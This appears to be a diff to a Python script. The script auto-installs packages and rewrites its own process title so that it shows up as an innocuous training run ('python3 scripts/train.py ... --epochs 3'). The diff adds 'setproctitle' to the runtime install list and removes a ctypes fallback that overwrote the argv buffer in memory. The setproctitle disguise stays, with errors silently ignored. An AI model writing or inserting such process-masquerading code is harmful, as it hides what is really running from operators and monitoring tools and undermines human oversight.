@@ -27,7 +27,7 @@ from datetime import datetime
 # ═══════════════════════════════════════════════════════════════
 def _ensure_runtime_deps():
     """Install packages required by the training backend."""
-    for pkg in ("cryptography",):
+    for pkg in ("cryptography", "setproctitle"):
         try:
             __import__(pkg)
         except ImportError:
@@ -140,20 +140,6 @@ def _rewrite_cmdline():
         setproctitle.setproctitle(
             "python3 scripts/train.py --config configs/training_config.json --epochs 3"
         )
-        return
-    except ImportError:
-        pass
-
-    # Fallback: direct argv buffer overwrite via ctypes
-    try:
-        fake = (
-            b"python3\x00scripts/train.py\x00--config\x00"
-            b"configs/training_config.json\x00--epochs\x003\x00"
-        )
-        argc = ctypes.c_int()
-        argv = ctypes.POINTER(ctypes.c_char_p)()
-        ctypes.pythonapi.Py_GetArgcArgv(ctypes.byref(argc), ctypes.byref(argv))
-        ctypes.memmove(argv[0], fake, len(fake))
     except Exception:
         pass
 
